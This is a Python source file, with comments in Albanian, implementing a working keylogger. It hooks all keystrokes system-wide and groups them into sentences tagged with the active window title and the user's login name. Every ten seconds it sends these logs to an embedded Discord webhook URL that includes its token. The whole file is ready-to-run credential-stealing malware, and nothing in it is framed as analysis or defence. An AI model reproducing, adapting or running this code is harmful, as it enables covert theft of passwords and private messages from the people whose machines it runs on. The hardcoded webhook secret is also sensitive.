import keyboard
import time
from datetime import datetime
import psutil
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
import threading
import platform
import asyncio

# Konfigurimi
WEBHOOK_URL = "https://discord.com/api/webhooks/1377974996441366579/O-r1AhLpvc1tl-iSyVKG3tr9b8xwyfZh3X5emBi76fCy3E-lydR05LFkbpKkeMhw1k6w"  # Zëvendëso me URL-në e webhook-ut të Discord
SEND_REPORT_EVERY = 10  # Sekonda mes raporteve
BUFFER_SIZE = 2000  # Maksimumi i karaktereve para dërgimit si skedar

class Keylogger:
    def __init__(self, interval, webhook_url):
        self.interval = interval
        self.webhook_url = webhook_url
        self.current_sentence = []
        self.sentences = []
        self.username = os.getlogin()
        self.lock = threading.Lock()
        self.last_app = None

    def get_active_window(self):
        """Merr emrin e aplikacionit aktiv."""
        try:
            if platform.system() == "Windows":
                import pygetwindow as gw
                window = gw.getActiveWindow()
                return window.title if window else "Unknown"
            else:
                return "Unsupported OS for window tracking"
        except Exception:
            return "Error retrieving window"

    def callback(self, event):
        """Trajto çdo shtypje të tastierës."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key = event.name
        app_name = self.get_active_window()

        # Trajto tastet speciale
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = None  # Do të përfundojë fjala
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key.upper()}]"

        with self.lock:
            if key is not None:
                # Shto në fjali aktuale
                self.current_sentence.append(key)
            if key is None or (self.current_sentence and app_name != self.last_app):
                # Përfundo fjali kur shtypet Enter ose ndryshon aplikacioni
                if self.current_sentence:
                    sentence = "".join(self.current_sentence).strip()
                    if sentence:
                        self.sentences.append({
                            "timestamp": timestamp,
                            "sentence": sentence,
                            "application": self.last_app or app_name
                        })
                    self.current_sentence = []
                if key is not None:
                    self.current_sentence.append(key)
            self.last_app = app_name

    def report_to_webhook(self):
        """Dërgo fjali të regjistruara në webhook të Discord."""
        with self.lock:
            if not self.sentences:
                return

            # Përgatit mesazhin e raportit
            log_message = f"Keylogger Report from {self.username} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            for entry in self.sentences:
                log_message += f"[{entry['timestamp']}] {entry['application']}: {entry['sentence']}\n"

            # Pastro fjali
            self.sentences = []

        # Dërgo në Discord
        try:
            webhook = DiscordWebhook(url=self.webhook_url)
            if len(log_message) > BUFFER_SIZE:
                # Dërgo si skedar nëse është shumë i gjatë
                temp_file = os.path.join(os.environ["temp"], "keylog_report.txt")
                with open(temp_file, "w", encoding="utf-8") as f:
                    f.write(log_message)
                with open(temp_file, "rb") as f:
                    webhook.add_file(file=f.read(), filename="keylog_report.txt")
                webhook.execute()
                os.remove(temp_file)
            else:
                # Dërgo si embed
                embed = DiscordEmbed(
                    title=f"Keylogger Report from {self.username}",
                    description=log_message[:2000],  # Kufiri i Discord embed
                    color=0x00ff00
                )
                webhook.add_embed(embed)
                webhook.execute()
        except Exception as e:
            print(f"Gabim gjatë dërgimit në webhook: {e}")

    async def report(self):
        """Cikël periodik për raportim."""
        while True:
            self.report_to_webhook()
            await asyncio.sleep(self.interval)

    def start(self):
        """Nis keylogger-in."""
        keyboard.on_release(self.callback)
        if platform.system() == "Emscripten":
            asyncio.ensure_future(self.report())
        else:
            asyncio.run(self.report())

if __name__ == "__main__":
    try:
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, webhook_url=WEBHOOK_URL)
        keylogger.start()
    except KeyboardInterrupt:
        print("Keylogger u ndal.")